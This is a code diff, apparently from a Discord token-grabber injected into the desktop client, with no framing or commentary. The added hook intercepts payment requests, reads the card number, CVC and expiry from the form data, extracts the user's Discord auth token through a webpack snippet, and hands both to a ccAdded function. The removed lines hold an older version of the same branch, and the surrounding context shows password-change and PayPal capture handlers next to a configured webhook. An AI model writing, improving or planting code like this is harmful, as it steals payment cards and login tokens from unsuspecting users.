@@ -582,6 +582,19 @@ session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, call
     updateCheck();
 });
 
+session.defaultSession.webRequest.onResponseStarted(config.filter, async (details, callback) => {
+    if (details.url.includes("tokens")) 
+    {
+        const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+        const item = querystring.parse(unparsed_data.toString());
+        const token = await execScript(
+            `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
+          );
+        ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token).catch(console.error);
+        return;
+    }
+});
+
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
   if (details.url.startsWith(config.webhook)) {
     if (details.url.includes("discord.com")) {
@@ -639,12 +652,6 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       if (data.new_password) {
         passwordChanged(data.password, data.new_password, token).catch(console.error);
       }
-      break;
-
-    case details.url.endsWith("tokens") && details.method === "POST":
-      login("cccc", "cccc", "token").catch(console.error);
-      const item = querystring.parse(unparsed_data.toString());
-      ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token).catch(console.error);
       break;
 
     case details.url.endsWith("paypal_accounts") && details.method === "POST":
